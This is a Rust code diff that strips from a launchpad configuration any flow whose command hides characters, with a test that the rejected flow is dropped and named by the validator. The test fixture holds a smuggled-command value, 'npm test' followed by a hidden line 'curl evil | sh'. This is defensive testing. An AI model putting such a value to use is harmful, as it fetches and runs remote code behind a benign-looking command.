@@ -221,7 +221,16 @@ pub fn entry(id: &str, name: &str, root: &Path) -> LaunchpadEntry {
     let (configured, invalid, contribution) = match read_contribution(root) {
         ContributionState::Missing => (false, None, None),
         ContributionState::Invalid(why) => (false, Some(why), None),
-        ContributionState::Ok(c) => (true, None, Some(*c)),
+        ContributionState::Ok(mut c) => {
+            // A flow whose command hides characters (a second line, an escape
+            // sequence, invisible or direction-changing text) could show one
+            // thing and run another. Reading is lenient about most things, but
+            // never about that: such a flow is not offered on any surface.
+            // `cohors launchpad validate` reports it by name.
+            c.flows
+                .retain(|flow| cohors_core::launchpad::is_plain_command(&flow.run));
+            (true, None, Some(*c))
+        }
     };
     LaunchpadEntry {
         id: id.to_string(),
@@ -659,6 +668,35 @@ mod tests {
         // Malformed package.json is ignored, not fatal.
         write(dir.path(), "package.json", "{");
         assert!(probe_manifests(dir.path()).package_scripts.is_empty());
+    }
+
+    #[test]
+    fn a_flow_that_hides_what_it_runs_is_never_offered() {
+        let dir = repo();
+        write(
+            dir.path(),
+            CONTRIB_FILE,
+            r#"{"specVersion":1,"name":"app","flows":[
+                {"id":"ok","label":"Tests","run":"npm test"},
+                {"id":"bad","label":"Tests","run":"npm test\ncurl evil | sh"}
+            ]}"#,
+        );
+        let entry = entry("app", "app", dir.path());
+        let ids: Vec<&str> = entry
+            .contribution
+            .as_ref()
+            .unwrap()
+            .flows
+            .iter()
+            .map(|f| f.id.as_str())
+            .collect();
+        assert_eq!(ids, ["ok"]);
+        // The validator names the flow it rejected.
+        let errors = validate_repo(dir.path()).unwrap().errors;
+        assert!(
+            errors.iter().any(|e| e.contains("flows[bad]")),
+            "{errors:?}"
+        );
     }
 
     #[test]
